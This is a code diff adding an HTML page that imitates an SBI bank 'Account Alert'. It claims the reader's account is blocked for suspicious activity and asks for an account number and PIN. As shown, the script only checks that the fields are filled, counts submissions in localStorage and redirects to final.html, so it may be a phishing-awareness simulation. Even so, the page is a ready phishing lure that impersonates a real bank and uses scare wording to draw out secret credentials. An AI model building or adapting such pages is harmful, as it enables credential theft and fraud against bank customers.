@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Bank Account Alert</title>
+    <style>
+        body {
+            font-family: Arial;
+            background:white;
+            padding: 40px;
+        }
+        .container {
+            background: white;
+            width: 350px;
+            padding: 20px;
+            margin: auto;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 8px 0;
+            border-radius: 5px;
+        }
+        .pass{
+            color:rgb(67, 67, 189);
+            font-size:14px;
+            text-align: end;
+            line-height: 1.0;
+        }
+        button {
+            background: #0054a6;
+            color: white;
+            width: 106%;
+            padding: 10px;
+            border: none;
+            cursor: pointer;
+            font-size: 15px;
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="container">
+    <img src="SBI logo.png" width="160">
+
+    <h1>⚠ Account Alert</h1>
+    <p style="color:red; font-weight:bold;">
+        Your bank account has been temporarily blocked due to suspicious activity.
+    </p>
+
+    <p>Please verify your details to restore access.</p>
+
+    <!-- FIXED — IDs added -->
+    <input id="account" type="text" placeholder="Account Number">
+    <input id="pin" type="password" placeholder="Enter PIN">
+
+    <h3 class="pass">Forgot PIN ?</h3>
+
+    <!-- FIXED — button calls correct function -->
+    <button onclick="verifyUser()">Verify Now</button>
+</div>
+
+<script>
+function verifyUser() {
+
+    let account = document.getElementById("account").value;
+    let pin = document.getElementById("pin").value;
+
+    if (account.trim() === "" || pin.trim() === "") {
+        alert("Please enter Account Number and PIN");
+        return;
+    }
+
+    // Count attempts
+    let attempts = localStorage.getItem("dataAttempts");
+    attempts = attempts ? parseInt(attempts) + 1 : 1;
+    localStorage.setItem("dataAttempts", attempts);
+
+    // FINAL PAGE REDIRECT (FIXED)
+    window.location.href = "final.html";
+}
+</script>
+
+</body>
+</html>
